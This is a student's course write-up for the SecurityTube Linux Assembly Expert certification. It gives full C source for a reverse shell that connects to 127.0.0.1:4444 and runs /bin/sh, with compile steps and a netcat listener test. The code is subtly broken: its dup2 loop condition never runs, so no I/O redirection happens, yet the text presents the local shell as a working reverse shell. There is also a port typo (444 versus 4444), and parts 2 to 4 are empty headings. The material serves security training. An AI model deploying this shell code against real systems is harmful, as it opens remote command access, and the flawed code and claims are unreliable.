# Note

This MD file has been created for the SecurityTube Linux Assembly Expert certification (https://www.pentesteracademy.com/course?id=3). Student ID: 14183.

This is part 1/4 of the exercice 2.

# Exo 2 - Reverse shellcode - Part 1 - C Reverse Shell

### C Reverse Shell - Creation

Reverse shell creation is simpler in a C point of view. First a socket is created, then a connection to the target is done and at last STDIN/STDOUT/STDERR are redirect and execve is run.

The reverse shell starts and ends as the bind shell

```
int main()
{
	int my_socket = socket(AF_INET, SOCK_STREAM, 0);

	// NEW THINGS HERE 

	int i;
	for(i = 0; i++; i <3)
		dup2(client, i);

	execve("/bin/sh", NULL, NULL);
	return 0;
}
```

*Socket *usage is easy to understant using the manual

```
NAME
       connect - initiate a connection on a socket

SYNOPSIS
       #include <sys/types.h>
       #include <sys/socket.h>

       int connect(int sockfd, const struct sockaddr *addr,
                   socklen_t addrlen);
```

Again a *sockaddr* structure must be created, the only change here is we are using our target IP address. In order to have an C formated IP address, *inet_addr *function is used.

From the manual:
```
The inet_addr() function converts the Internet host address cp from IPv4 numbers-and-dots notation into binary data in network byte order.
```

### C Reverse Shell - Final code
```
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>

int main()
{
	int my_socket = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in my_sockaddr;
	my_sockaddr.sin_family = AF_INET;
    	my_sockaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    	my_sockaddr.sin_port = htons(4444);

    	connect(my_socket, (struct sockaddr *)&my_sockaddr, sizeof(my_sockaddr));

	int i;
	for(i = 0; i++; i <3)
		dup2(my_socket, i);

	execve("/bin/sh", NULL, NULL);
	return 0;
}

```
### Testing the reverse shell

First, the C file is compiled.
```
cervoise@slae:~/exam/reverse$ gcc reverse_shell.c -o reverse_shell
```
Then netcat is used to listen on port 444
```
cervoise@slae:~/exam/reverse$ nc -lv 4444
```

And by running the ELF binary, a (local) reverse shell is gain
```
cervoise@slae:~/exam/reverse$ ./reverse_shell 
$ id
uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
$ exit
```

# Exo 2 - Reverse shellcode - Part 2 - Reverse Shellcode

# Exo 2 - Reverse shellcode - Part 3 - Optimized Reverse Shellcode

# Exo 2 - Reverse shellcode - Part 4 - Reverse Shellcode Generator
